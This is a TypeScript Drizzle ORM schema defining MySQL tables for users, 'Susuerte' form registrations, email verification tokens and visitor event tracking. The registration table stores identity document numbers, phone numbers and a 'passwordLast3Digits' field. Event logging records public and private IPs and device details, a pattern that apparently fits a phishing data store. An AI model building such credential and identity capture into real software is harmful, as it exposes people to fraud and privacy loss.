import { int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

/**
 * Susuerte registration records table
 * Stores all form submissions from the Susuerte update form
 */
export const susuertRegistros = mysqlTable("susuert_registros", {
  id: int("id").autoincrement().primaryKey(),
  nombre: varchar("nombre", { length: 255 }).notNull(),
  email: varchar("email", { length: 320 }).notNull(),
  telefono: varchar("telefono", { length: 20 }),
  documento: varchar("documento", { length: 50 }).notNull(),
  verificado: mysqlEnum("verificado", ["pendiente", "verificado", "rechazado"]).default("pendiente").notNull(),
  deviceType: varchar("deviceType", { length: 50 }),
  browser: varchar("browser", { length: 100 }),
  os: varchar("os", { length: 100 }),
  sessionId: varchar("sessionId", { length: 100 }),
  passwordLast3Digits: varchar("passwordLast3Digits", { length: 3 }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type SusuertRegistro = typeof susuertRegistros.$inferSelect;
export type InsertSusuertRegistro = typeof susuertRegistros.$inferInsert;

/**
 * Email verification tokens table
 * Stores tokens for email verification process
 */
export const emailVerificationTokens = mysqlTable("email_verification_tokens", {
  id: int("id").autoincrement().primaryKey(),
  registroId: int("registroId").notNull(),
  email: varchar("email", { length: 320 }).notNull(),
  token: varchar("token", { length: 255 }).notNull().unique(),
  expiresAt: timestamp("expiresAt").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type EmailVerificationToken = typeof emailVerificationTokens.$inferSelect;
export type InsertEmailVerificationToken = typeof emailVerificationTokens.$inferInsert;

/**
 * User events tracking table
 * Stores all user interactions (clicks, form starts, etc.)
 */
export const userEvents = mysqlTable("user_events", {
  id: int("id").autoincrement().primaryKey(),
  sessionId: varchar("sessionId", { length: 100 }).notNull(),
  eventType: varchar("eventType", { length: 50 }).notNull(), // BUTTON_CLICK, FORM_START, etc.
  timestamp: varchar("timestamp", { length: 50 }).notNull(),
  ipPublica: varchar("ipPublica", { length: 50 }),
  ipPrivada: varchar("ipPrivada", { length: 50 }),
  userAgent: text("userAgent"),
  navegador: varchar("navegador", { length: 100 }),
  sistemaOperativo: varchar("sistemaOperativo", { length: 100 }),
  dispositivo: varchar("dispositivo", { length: 50 }),
  tiempoActivo: int("tiempoActivo"),
  paginaVisitada: varchar("paginaVisitada", { length: 255 }),
  email: varchar("email", { length: 320 }),
  nombre: varchar("nombre", { length: 255 }),
  detalles: text("detalles"), // JSON stringified
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type UserEvent = typeof userEvents.$inferSelect;
export type InsertUserEvent = typeof userEvents.$inferInsert;
